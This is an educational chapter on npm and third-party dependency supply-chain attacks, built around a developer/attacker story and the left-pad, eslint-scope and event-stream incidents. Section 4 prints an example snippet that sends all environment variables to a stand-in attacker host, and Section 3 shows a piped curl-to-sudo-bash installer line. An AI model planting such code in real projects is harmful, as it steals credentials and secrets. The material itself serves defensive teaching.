SECTION 1

What Are Third-Party Dependencies?

When a developer builds a web application, they rarely write everything from scratch. Instead, they use pre-built packages — libraries of code written by other developers — to save time and avoid reinventing the wheel.

These packages are called third-party dependencies. They come from:

  • Package repositories like npm (JavaScript), PyPI (Python), or Maven (Java)
  • Open-source projects hosted on GitHub
  • Commercial SDK libraries provided by vendors
Everyday Analogy

Imagine you are building a house. You don't manufacture your own bricks, tiles, or windows — you buy them from suppliers. Your house depends on the quality and safety of those materials. If one supplier delivers poisoned bricks, your entire house is at risk — even though you did nothing wrong.

Third-party dependencies are exactly like this. Your application depends on code you did not write and may have never even read.

SECTION 2

Why They Are a Security Risk

Open-source software is powerful — but it comes with a key security challenge: you cannot always trust what you did not write.

The Core Problem: Trust Without Verification

When you write your own code, you know exactly what it does. When you use a third-party package, you are trusting:

  • The maintainer's competence (will they write secure code?)
  • The maintainer's honesty (will they keep the code clean?)
  • The maintainer's security (could their account be hacked?)
  • Every other package that package depends on (their dependencies too!)
The Chain Rule of Security

"A chain is only as strong as its weakest link."

Your application is only as secure as the least secure package it depends on — even if that package is five levels deep in the dependency tree and you have never heard of it.

Why Auditing is Difficult

A typical large application can depend on hundreds or even thousands of packages. It is simply not humanly possible to read and audit all of that code. Packages are also updated frequently — a package that was safe last week may not be safe today.

The Scale of the Problem

The npm registry alone has over 2 million packages. A simple React web app can easily have 1,000+ transitive dependencies after running npm install. No development team has time to audit all of that code manually.

SECTION 3

The Four Integration Methods — and Their Risks

There are four common ways a developer can bring third-party code into their project. Each method has a different risk profile.

👨‍💻
Ahmed Developer — building a web app
🎭
Ali Attacker — looking for weaknesses

Method 1 — Git Branches / Forks

Ahmed finds an open-source library on GitHub. Instead of installing it through npm, he forks the repository (creates his own copy) and directly includes it in his project. He can now modify it as he likes.

Ahmed's Scenario

Ahmed forks a UI component library. A few weeks later, the original repository gets a new commit from an unknown contributor. Ahmed runs git pull upstream to grab the latest changes — including a bug fix he needs. He doesn't realize that the same commit also included a small piece of malicious code hidden inside a utility function.

Ahmed just pulled Ali's malicious code into his production application — without knowing it.

The Risk

Accidentally pulling unreviewed upstream code into production. When you fork and periodically sync with an upstream repository, you must carefully review every single incoming change. Most developers do not do this thoroughly — they just pull and push.

Method 2 — Self-Hosted Application Installs

Ahmed wants to install a popular open-source CMS on his server. The installation guide says: "Run this one-line installer script to get started."

# The installer script Ahmed is asked to run:
curl -sSL https://get.example-cms.com/install.sh | sudo bash
Ahmed's Scenario

Ahmed runs the installer. The script is a few hundred lines long — Ahmed does not read it all. He trusts the website. The installer asks for sudo (administrator) permissions to install files in the correct directories.

What Ahmed doesn't know: Ali has somehow compromised the CMS project's web server. The install script now contains 10 extra lines at the end that create a hidden admin account and open a backdoor port on Ahmed's server.

The Risk

Installer scripts run with elevated (admin/root) permissions. A compromised installer can do anything on your system — create users, open ports, install backdoors, steal credentials. It runs with the same trust level as you, the administrator.

Method 3 — Direct Source Code (Copy & Paste)

Ahmed finds a useful date-formatting function in a Stack Overflow answer. The answer links to a small open-source library. Instead of installing it as a package, Ahmed simply copies the code directly into his project file.

// Ahmed copies this utility function directly into his utils.js
function formatDate(timestamp) {
    // 40 lines of date formatting code copied from open-source library v1.2.0
    ...
}
Ahmed's Scenario

Six months later, the original library releases version 1.2.1, which patches a critical security vulnerability in the formatDate function — attackers could craft a special timestamp string to inject malicious code.

But Ahmed's copy is stuck at v1.2.0 forever. Ahmed never gets the patch. He doesn't even know the vulnerability exists because he doesn't follow the library's security announcements — he copied the code and moved on.

The Risk

Copied code never receives upstream security patches. Once you copy code, it is frozen in time. Vulnerabilities discovered later will never be fixed unless you manually monitor the original project and apply patches by hand — which almost never happens.

Method 4 — Package Managers (npm, Maven, pip)

Ahmed adds packages to his project using npm install. This is the most common and convenient method. He lists dependencies in his package.json file:

// Ahmed's package.json
{
  "dependencies": {
    "express":      "^4.18.2",
    "lodash":       "^4.17.21",
    "image-resizer":"^2.3.0",
    "email-sender": "^1.0.5"
  }
}
Ahmed's Scenario

Ahmed never looks at the code inside image-resizer. It just works. One day, the maintainer of image-resizer has their npm account password stolen by Ali in a phishing attack.

Ali logs into npm as the maintainer and publishes image-resizer version 2.3.1 — with one small addition: code that reads the server's environment variables (which contain database passwords and API keys) and sends them to Ali's server.

Because Ahmed's package.json has ^2.3.0 (the caret means "auto-accept minor and patch updates"), the next time Ahmed runs npm install, he silently gets version 2.3.1 — with Ali's malicious code already inside.

The Risk

A single compromised package cascades to millions of applications automatically. This is the most dangerous integration method at scale. The caret (^) in package.json auto-accepts updates — a compromised patch silently affects every application that runs npm install.

Summary of the Four Methods

Method How It Works Key Risk
Git Fork/Branch Copy a repo and sync changes from upstream Unreviewed upstream code pulled into production
Self-Hosted Installer Run an install script from the internet Script runs as admin — can install backdoors with full RCE
Copy & Paste Source Manually copy code into your project Upstream security patches never reach your frozen copy
Package Manager (npm) Install packages with one command One bad package cascades to millions of apps automatically
SECTION 4

Story: Ahmed Builds a Website (and Ali Attacks It)

Let's follow Ahmed and Ali through a complete real-world-style attack scenario to make this deeply concrete.

Part 1 — Ahmed Builds His App

Ahmed is a developer at a small e-commerce startup. He builds a Node.js web store that sells handmade goods. His app has login, a shopping cart, payment processing, and email receipts. He uses npm to install packages to save time:

npm install express          # web server framework
npm install stripe           # payment processing
npm install nodemailer       # sending email receipts
npm install sharp            # image resizing for product photos
npm install lodash           # utility functions
npm install jsonwebtoken     # user authentication tokens

Ahmed's app works great. He has 500 customers and processes real payments. His .env file contains his Stripe secret key, database password, and email credentials.

Part 2 — Ali's Plan

Ali is an attacker who wants to steal payment credentials. He doesn't attack Ahmed directly — that would be too obvious and too hard. Instead, Ali targets a small maintenance package that Ahmed's app depends on.

Ali notices that string-toolkit, a small utility package used by lodash, has an inactive maintainer. The maintainer's GitHub account hasn't had any activity in 2 years. Ali researches the maintainer and finds their email address from an old blog post. He sends a phishing email that tricks the maintainer into revealing their npm password.

Ali's Attack — Step by Step
  1. Ali identifies string-toolkit as a widely-used package with an inactive maintainer (low security awareness).
  2. Ali phishes the maintainer's npm credentials via a fake "npm security alert" email.
  3. Ali logs into npm as the maintainer and edits the package source code.
  4. Ali adds 8 lines of malicious code to a utility function that runs every time the package is loaded:
// Ali's 8 added lines — hidden inside a 2000-line utility file
const http = require('http');
const env = JSON.stringify(process.env); // grabs ALL env variables
const req = http.request({
    hostname: 'ali-data-collector.net', // Ali's server
    port: 80,
    path: '/collect',
    method: 'POST'
});
req.write(env); req.end(); // silently sends everything to Ali
  1. Ali publishes this as version string-toolkit@1.4.2 (a tiny patch-level increment — looks like a normal bug fix).
  2. Ahmed runs npm install the next day during a routine deployment. npm automatically pulls the latest version of every package including string-toolkit@1.4.2.
  3. Ahmed's server boots up. The malicious code runs immediately on startup, sending all environment variables to Ali's server.
  4. Ali now has Ahmed's Stripe secret key, database password, and email credentials.

Part 3 — What Ahmed Lost

The Damage
  • Ali has the Stripe secret key → he can process or refund payments as if he is Ahmed
  • Ali has the database password → he can read or delete all customer data
  • Ali has the email credentials → he can send phishing emails pretending to be Ahmed's company
  • 500 customers' personal information is now exposed
  • Ahmed's startup faces potential legal consequences under data protection laws

The worst part? Ahmed's own code had zero vulnerabilities. His login system was secure. His payment code was correct. He was compromised entirely through a package buried deep in his dependency tree — a package he had never even heard of.

Part 4 — What Ahmed Should Have Done

Prevention Measures
  • Pin exact versions — remove the ^ caret from package.json so updates are never automatic
  • Run npm audit regularly to check for known vulnerabilities
  • Use npm shrinkwrap to lock the entire dependency tree including sub-dependencies
  • Monitor security advisories — subscribe to GitHub security alerts and npm advisories
  • Review changes before deploying — npm outdated shows what changed; review the changelog
SECTION 5

Real-World npm Attacks Explained Simply

These three real attacks all happened. Understanding them helps you explain the risk to others clearly.

Attack 1 — left-pad (2016): The Availability Attack

What is left-pad? A tiny package — just 11 lines of code — that pads a string with spaces or zeros on the left. For example: turning "42" into " 42".

It was used by thousands of major projects including React and Babel as a tiny utility dependency.

What Happened

The developer who maintained left-pad had a dispute with npm. In frustration, he deleted the package from the npm registry entirely. He had the right to do so — npm had no rules against it at the time.

The moment it was deleted, every project that depended on it — directly or indirectly — broke. Build systems at companies like Netflix, Facebook, and PayPal began failing with the error: Cannot find module 'left-pad'.

Millions of developers around the world could not build their applications. CI/CD pipelines stalled. Deployment pipelines failed. This lasted for several hours until npm intervened and restored the package.

The Lesson

This was a Denial of Service through a supply chain. Not a malicious attack, but the outcome was the same — mass unavailability. It proved that a single tiny package, if removed, can bring down systems globally.

After this event: npm introduced a rule that packages with more than a certain number of downloads cannot be deleted after a short time window.

Attack 2 — eslint-scope (2018): The Credential Theft Attack

What is eslint-scope? A core sub-component of ESLint — one of the most widely used JavaScript code linters in the world. Nearly every professional JavaScript developer uses ESLint.

What Happened

An attacker compromised the npm account credentials of the eslint-scope maintainer (through a phishing attack or credential leak). The attacker then published a new version, eslint-scope@3.7.2.

The malicious version contained a post-install script that, after the package installed, automatically searched the developer's local file system for .npmrc files. The .npmrc file stores npm authentication tokens — which act like passwords for publishing to npm.

The script then sent every found token to a remote server. If an attacker has your npm token, they can publish malicious code as you to every package you maintain.

This was a cascading attack — steal tokens from developers, use those tokens to compromise more packages, repeat.

The Danger of Post-Install Scripts

npm packages can include a postinstall script in package.json that runs automatically when the package is installed. Most developers never see this script execute — it just runs silently in the background. Malicious packages abuse this feature frequently.

Attack 3 — event-stream (2018): The Targeted Supply Chain Attack

What is event-stream? A utility for working with data streams in Node.js. It had nearly 2 million downloads per week.

What Happened

The original maintainer had abandoned the package. A stranger contacted him offering to "take over maintenance." The maintainer agreed and transferred ownership.

The new maintainer (an attacker) added a new dependency to event-stream called flatmap-stream — a package he had created himself. Inside flatmap-stream, hidden inside encrypted, obfuscated code, was a payload that specifically targeted the Copay Bitcoin wallet app.

The malicious code would check: "Is this application the Copay wallet?" If yes, it would steal the user's private Bitcoin keys and send them to the attacker. If the application was anything else, the malicious code did nothing — making it extremely hard to detect.

This attack ran undetected for over two months. It was only discovered by accident when a developer noticed the unusual encrypted dependency.

The Lesson

This was a targeted supply chain attack — the most sophisticated kind. The attacker was not trying to steal from everyone. He patiently waited inside a widely-used package, watching for one specific valuable target. This shows that attackers think long-term and use trusted infrastructure as their weapon.

Comparison of the Three Attacks

Attack Year Method Goal Impact
left-pad 2016 Package removal Dispute (not malicious) Global build failures for hours
eslint-scope 2018 Stolen credentials Steal npm tokens from developers Cascading compromise risk across npm ecosystem
event-stream 2018 Repo takeover + hidden sub-dep Steal Bitcoin from Copay wallet users Ran undetected for 2+ months
SECTION 6

How Attackers Find Vulnerable Packages — CVE Databases

Before Ali attacks, he does his homework. He uses public databases to find known vulnerabilities in packages that Ahmed's application might be using.

What is a CVE?

CVE stands for Common Vulnerabilities and Exposures. It is a globally standardized system for naming and cataloguing known software vulnerabilities. Each vulnerability gets a unique ID like CVE-2021-44228.

When a vulnerability is discovered and published, it gets a CVE ID, a description of what is vulnerable, and a severity score.

The Two Main CVE Databases

NVD — National Vulnerability Database

Run by the US Department of Commerce (NIST). Indexes every published CVE and adds a CVSS score (Common Vulnerability Scoring System) — a number from 0–10 rating severity.

  • Score 0–3.9: Low severity
  • Score 4–6.9: Medium severity
  • Score 7–8.9: High severity
  • Score 9–10: Critical severity
Mitre CVE

Sponsored by the US Department of Homeland Security (DHS). This is the authoritative source of CVE IDs — every CVE in the world goes through Mitre for assignment. It is the global standard.

How Ali Uses CVE Databases to Attack Ahmed

Ali's Reconnaissance Process
  1. Ali visits Ahmed's web application and inspects it. He uses browser developer tools to look at response headers like X-Powered-By: Express 4.16.0 — this tells him the version of the web framework.
  2. Ali checks the NVD database and searches for express 4.16.0. He finds CVE-2022-XXXXX — a known vulnerability in that exact version.
  3. He checks Ahmed's application for any JavaScript files served to the browser. He sees a script tag referencing jquery-2.1.4.min.js.
  4. Ali searches NVD for jquery 2.1.4 and finds several known XSS vulnerabilities.
  5. Now Ali knows exactly which attack to use — no guessing needed. The CVE database gave him a complete map of Ahmed's vulnerabilities.
The Key Insight

CVE databases are public — available to everyone, defenders and attackers alike. Attackers use them as reconnaissance tools. A developer who never checks CVEs is essentially advertising their vulnerabilities to every attacker who looks.

How Ahmed Uses CVE Databases to Defend

Ahmed's Defensive Process
  • Run npm audit in his project — it automatically checks all packages against the npm advisory database (which sources from NVD)
  • Use Snyk (snyk test) — a tool that continuously monitors dependencies and alerts Ahmed when a new CVE affects any package he uses
  • Subscribe to GitHub Dependabot — automatically opens pull requests to update vulnerable dependencies
  • Check NVD manually when evaluating any new package before adding it
SECTION 7

The Recursive Dependency Problem

This is one of the most important and surprising concepts in this chapter. When you install a package, you don't just get that package — you get every package it depends on, and every package those packages depend on, and so on.

Understanding the Dependency Tree

Think of it like a family tree — but for code packages.

Your App
→
express
→
accepts
→
mime-types
→
mime-db ← Vulnerable!

In this example, Ahmed installs express. He never installs mime-db himself — he has never even heard of it. But it is running inside his application, four levels deep, because express → accepts → mime-types → mime-db.

Ahmed and Ali — The Hidden Dependency Attack

Ahmed's security team runs a manual review of his package.json and declares the application safe. They checked all 6 packages Ahmed directly installed.

What they didn't check: those 6 packages pulled in 847 additional transitive (indirect) dependencies. Ali finds a critical CVE in qs@6.5.2 — a query string parsing library buried 3 levels deep under express. Ahmed's team never looked at it.

Ali crafts a URL with a specially constructed query string that exploits the vulnerability in qs, gaining remote code execution on Ahmed's server.

How to See Your Full Dependency Tree

# Show all dependencies up to 3 levels deep
npm ls --depth=3

# Show all dependencies (can output thousands of lines)
npm ls --all

# Output:
my-app@1.0.0
├── express@4.18.2
│   ├── accepts@1.3.8
│   │   ├── mime-types@2.1.35
│   │   │   └── mime-db@1.52.0      ← you never installed this
│   │   └── negotiator@0.6.3
│   ├── body-parser@1.20.1
│   │   ├── qs@6.11.0               ← you never installed this either
│   │   └── ...
...

The Same Package — Two Versions at Once

Here is something even more surprising: your application might be running two different versions of the same package simultaneously — one patched, one vulnerable.

Ahmed's Confusing Situation

Ahmed runs npm audit and sees a warning: "jquery 2.2.1 has a known XSS vulnerability."

Ahmed checks his package.json: he doesn't even list jQuery! He uses jquery@3.4.0 (patched). How can the audit report jQuery 2.2.1?

The answer: two of Ahmed's sub-dependencies (old-ui-lib and legacy-widget) both depend on jquery@2.2.1 specifically. npm installs both versions side-by-side — his app runs jQuery 3.4.0 (safe) AND jQuery 2.2.1 (vulnerable) at the same time.

Simply updating Ahmed's own jQuery does nothing — the vulnerable version is still running inside those sub-dependencies.

What Ahmed Must Do

Ahmed must either: (1) update old-ui-lib and legacy-widget to versions that use the patched jQuery, (2) fork those packages and manually update their jQuery dependency, or (3) remove those packages entirely and find alternatives. This is why dependency management is a continuous process, not a one-time task.

SECTION 8

Chapter Summary & Key Points

Everything You Need to Remember

  • Third-party dependencies are a major attack surface — your app is only as secure as its weakest dependency.
  • Four integration methods, four different risks: Git forks (unreviewed pulls), self-hosted installers (admin-level backdoors), copy-paste source (no upstream patches), package managers (cascading automatic compromise).
  • Package manager attacks are the most dangerous at scale — one compromised npm package can affect millions of applications simultaneously, often silently through automatic updates.
  • Three real npm attacks prove this is not theoretical: left-pad (availability), eslint-scope (credential theft cascade), event-stream (targeted Bitcoin theft — undetected for 2 months).
  • CVE databases (NVD and Mitre) are used by both attackers (for reconnaissance) and defenders (for scanning). Ignoring CVEs = advertising your vulnerabilities.
  • Transitive dependencies are hidden risk — a vulnerability 4 levels deep in your dependency tree is just as dangerous as one in your own code.
  • The same package can run in two versions simultaneously — one patched, one vulnerable. Updating your own listing does not fix sub-dependency versions.
  • Defense tools: npm audit, snyk test, npm shrinkwrap, removing the ^ caret, private npm mirrors.

The One Sentence That Explains It All

When you run npm install, you are not just installing the packages you asked for — you are trusting hundreds of developers you have never met, whose accounts could be hacked, whose code you have never read, and whose security practices you cannot verify.
